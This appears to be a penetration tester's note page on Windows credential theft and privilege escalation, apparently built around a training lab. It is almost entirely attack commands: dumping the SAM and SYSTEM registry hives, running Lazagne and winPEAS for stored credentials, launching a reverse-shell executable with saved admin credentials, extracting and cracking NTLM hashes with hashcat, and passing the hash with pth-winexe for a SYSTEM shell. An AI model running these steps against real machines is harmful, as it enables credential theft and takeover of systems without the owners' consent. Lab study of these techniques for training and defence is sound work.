#### Reg save

```command prompt - target
reg save HKLM\SAM c:\SAM
```

```command prompt - target
reg save HKLM\System c:\System
```

[[4._File Transfers]]

```bash - kali
samdump2 -o hashes System SAM
```

![[Hashcat#NTLM]]


#### Lazagne

```
lazagne.exe all
```

#### Saved creds
1. Use winPEAS to check for saved credentials:

```command prompt - windows
.\winPEASx64.exe quiet cmd windowscreds
```

2. It appears that saved credentials for the admin user exist.

3. We can verify this manually using the following command:

```command prompt - windows
cmdkey /list
```

4. If the saved credentials arenâ€™t present, run the following script to refresh the credential:

```command prompt - windows
C:\PrivEsc\savecred.bat
```

5. We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:

![[rlwrap]]

[[1._Reverse Shells (WIN)#MSFVenom]]

```command prompt - windows
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

#### SAM
1. Backups of the SAM and SYSTEM files can be found in ===C:\Windows\Repair== and are readable by our user.

2. Copy the files back to Kali:

[[4._File Transfers]]

3. Download the latest version of the creddump suite:

```bash - kali
git clone https://github.com/Neohapsis/creddump7.git
```

4. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:

```bash - kali
python2 creddump7/pwdump.py SYSTEM SAM
```

5. Crack the admin user hash using hashcat:

```bash - kali
hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```


#### Pass the Hash
1. Extract the admin hash from the SAM in the previous step.

2. Use the hash with pth-winexe to spawn a command prompt (empty LM hash):

```bash - kali
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:$HASH' //$TARGET cmd.exe
```

3. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:

```bash - kali
pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:$HASH' //$TARGET cmd.exe
```
